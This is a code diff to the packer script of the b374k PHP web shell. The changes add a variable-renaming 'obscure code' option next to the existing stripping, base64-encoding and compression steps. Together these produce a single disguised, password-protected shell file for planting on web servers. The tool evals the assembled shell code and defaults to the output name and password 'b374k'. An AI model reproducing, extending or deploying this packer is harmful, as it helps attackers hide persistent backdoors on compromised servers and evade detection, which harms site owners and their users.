@@ -14,12 +14,6 @@ if (!defined('DETECT_SYS_CHARSET')) {
 	define('DETECT_SYS_CHARSET', DIRECTORY_SEPARATOR == '\\' ? 'gb2312' : 'utf-8');
 }
 
-// 预定义值，停止eval过程中无法正确返回系统常量
-$GLOBALS['SELF_FILE'] = __FILE__;
-
-// 排除替换变量
-$GLOBALS['obscure_except_replace_var'] = array('$this', '$_', '$1_', '$1', '$2', '$_SERVER', '$_SESSION', '$_REQUEST', '$_POST', '$_GET', '$_COOKIE', '$_FILES', '$GLOBALS', '$_COOKIE');
-
 $GLOBALS['packer']['title'] = "b374k shell packer";
 $GLOBALS['packer']['version'] = "0.4.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
@@ -28,10 +22,12 @@ $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
 
+require $GLOBALS['packer']['base_dir'] . 'common.php';
 require $GLOBALS['packer']['base_dir'] . 'jsPacker.php';
 
 /* PHP FILES START */
 $base_code = "";
+$base_code .= packer_read_file($GLOBALS['packer']['base_dir'] . "common.php");
 $base_code .= packer_read_file($GLOBALS['packer']['base_dir'] . "resources.php");
 $base_code .= packer_read_file($GLOBALS['packer']['base_dir'] . "main.php");
 $base_code .= packer_read_file($GLOBALS['packer']['base_dir'] . "filemanager.php");
@@ -100,7 +96,7 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		$content = trim($module_init) . "?>" . $base_code . $module_code . $layout;
 		eval($content);
 		die();
-	} elseif (isset($p['outputfile']) && isset($p['password']) && isset($p['module']) && isset($p['strip']) && isset($p['base64']) && isset($p['compress']) && isset($p['compress_level'])) {
+	} elseif (isset($p['outputfile']) && isset($p['password']) && isset($p['module']) && isset($p['strip']) && isset($p['base64']) && isset($p['obscure']) && isset($p['compress']) && isset($p['compress_level'])) {
 		$outputfile = trim($p['outputfile']);
 		if (empty($outputfile)) {
 			$outputfile = 'b374k.php';
@@ -116,6 +112,7 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 
 		$strip = trim($p['strip']);
 		$base64 = trim($p['base64']);
+		$obscure = trim($p['obscure']);
 		$compress = trim($p['compress']);
 		$compress_level = (int) $p['compress_level'];
 
@@ -149,10 +146,10 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		$htmlcode = trim($layout);
 		$phpcode = "<?php " . trim($module_init) . "?>" . trim($base_code) . trim($module_code);
 
-		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
+		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $obscure, $base64, $compress, $compress_level, $password), 'utf-8');
 	} else {
 
-		$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
+		$available_themes = "<td>Theme</td><td><select class='theme' style='width:150px;'>";
 		foreach ($GLOBALS['packer']['theme'] as $k) {
 			if ($k == $theme) {
 				$available_themes .= "<option selected='selected'>" . $k . "</option>";
@@ -161,7 +158,7 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 			}
 
 		}
-		$available_themes .= "</select></td></tr>";
+		$available_themes .= "</select></td>";
 
 		?><!doctype html>
 	<html>
@@ -186,7 +183,9 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		<table class='boxtbl'>
 			<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>
 			<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(",", $GLOBALS['packer']['module']); ?>'></td></tr>
+			<tr>
 			<?php echo $available_themes; ?>
+			</tr>
 			<tr><td colspan='2'>
 				<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>
 				<span class='button' id='runGo'>Run</span>
@@ -195,24 +194,34 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		</table>
 		<br>
 		<table class='boxtbl'>
-			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
-			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
-			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
-			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']); ?>'></td></tr>
-			<?php echo $available_themes; ?>
-			<tr><td>Strip Comments and Whitespaces</td><td>
-				<select id='strip' style='width:150px;'>
-					<option selected="selected">yes</option>
-					<option>no</option>
-				</select>
-			</td></tr>
+			<tr><th colspan='4'><p class='boxtitle'>Pack</p></th></tr>
+			<tr><td>Output</td><td colspan='3'><input id='outputfile' type='text' value='b374k.php'></td></tr>
+			<tr><td>Password</td><td colspan='3'><input id='password' type='text' value='b374k'></td></tr>
+			<tr><td>Module (separated by comma)</td><td colspan='3'><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']); ?>'></td></tr>
+			<tr>
+				<?php echo $available_themes; ?>
+				<td>Strip Comments and Whitespaces</td><td>
+					<select id='strip' style='width:150px;'>
+						<option selected="selected">yes</option>
+						<option>no</option>
+					</select>
+				</td>
+			</tr>
 
-			<tr><td>Base64 Encode</td><td>
-				<select id='base64' style='width:150px;'>
-					<option selected="selected">yes</option>
-					<option>no</option>
+			<tr>
+				<td>Obscure Code</td><td>
+				<select id='obscure' style='width:150px;'>
+					<option>yes</option>
+					<option selected="selected">no</option>
 				</select>
-			</td></tr>
+				<td>Base64 Encode</td><td>
+					<select id='base64' style='width:150px;'>
+						<option selected="selected">yes</option>
+						<option>no</option>
+					</select>
+				</td>
+			</td>
+			</tr>
 
 			<tr id='compress_row'><td>Compress</td><td>
 				<select id='compress' style='width:150px;'>
@@ -234,11 +243,11 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 				</select>
 			</td></tr>
 
-			<tr><td colspan='2'>
+			<tr><td colspan='4'>
 				<span class='button' id='packGo'>Pack</span>
 			</td></tr>
-			<tr><td colspan='2' id='result'></td></tr>
-			<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>
+			<tr><td colspan='4' id='result'></td></tr>
+			<tr><td colspan='4'><textarea id='resultContent'></textarea></td></tr>
 		</table>
 	</div>
 
@@ -269,10 +278,11 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 			module = $('#module_to_pack').val();
 			strip = $('#strip').val();
 			base64 = $('#base64').val();
+			obscure = $('#obscure').val();
 			compress = $('#compress').val();
 			compress_level = $('#compress_level').val();
 
-			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level}, function(res){
+			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, obscure:obscure, compress:compress, compress_level:compress_level}, function(res){
 				splits = res.split('{[|b374k|]}');
 				$('#resultContent').html(splits[1]);
 				$('#result').html(splits[0]);
@@ -315,9 +325,9 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		$output .= "\t-b\t\t\t\t\tencode with base64\n";
 		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
+		$output .= "\t-u\t\t\t\t\tobscure code\n";
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
 		$output .= "\t-k\t\t\t\t\tlist available themes\n";
-		$output .= "\t-u\t\t\t\t\tobscure code\n";
 
 	} else {
 		$opt = getopt("o:p:t:m:sbz:c:lk:u");
@@ -431,7 +441,7 @@ if (isset($_SERVER['REMOTE_ADDR'])) {
 		$htmlcode = trim($layout);
 		$phpcode = "<?php " . trim($module_init) . "?>" . trim($base_code) . trim($module_code);
 
-		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, $obscure);
+		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $obscure, $base64, $compress, $compress_level, $password);
 		$status = explode("{[|b374k|]}", $res);
 		$output .= "Result\t\t\t: " . strip_tags($status[0]) . "\n\n";
 	}
@@ -504,8 +514,8 @@ function packer_wrap_with_quote($str) {
 	return "\"" . $str . "\"";
 }
 
-function packer_output($str) {
-	header("Content-Type: text/plain;charset=" . DETECT_SYS_CHARSET);
+function packer_output($str, $charset = DETECT_SYS_CHARSET) {
+	header("Content-Type: text/plain;charset=" . $charset);
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
 	echo $str;
@@ -598,8 +608,8 @@ function obscure_php($content, $except) {
 	preg_match_all('/\$[a-z][a-z0-9_]*/i', $content, $out);
 	// 去重
 	$var = array_unique($out[0]);
-	$var_sort_fun = function($a, $b) {
-		return(strlen($a) < strlen($b));
+	$var_sort_fun = function ($a, $b) {
+		return (strlen($a) < strlen($b));
 	};
 	usort($var, $var_sort_fun);
 
@@ -612,7 +622,7 @@ function obscure_php($content, $except) {
 		// 随机
 		do {
 			$rand = rand_str(rand(1, $var_size));
-		} while (in_array('$'.$rand, $var) || in_array($rand, $str));
+		} while (in_array('$' . $rand, $var) || in_array($rand, $str));
 		$str[$rand] = $rand;
 		$num = count($str);
 	}
@@ -625,7 +635,7 @@ function obscure_php($content, $except) {
 			if (in_array($val, $except)) {
 				continue;
 			}
-	
+
 			// 替换变量, 排除类变量
 			$content = preg_replace('@(?<!protected\s)(?<!public\s)(?<!private\s)\\' . $val . '@', '$' . array_pop($str), $content);
 		}
@@ -687,7 +697,7 @@ function rand_str($len = 6) {
 	return $str;
 }
 
-function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, $obscure) {
+function packer_b374k($output, $phpcode, $htmlcode, $strip, $obscure, $base64, $compress, $compress_level, $password) {
 	$content = "";
 	if (is_file($output)) {
 		if (!is_writable($output)) {
@@ -734,7 +744,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	$content = $phpcode . $htmlcode;
 
 	if ($obscure == 'yes') {
-		$content = obscure_php($content, $GLOBALS['obscure_except_replace_var']);
+		$content = obscure_php($content, $GLOBALS['config']['obscure_except_replace_var']);
 	}
 
 	if ($compress == 'gzdeflate') {
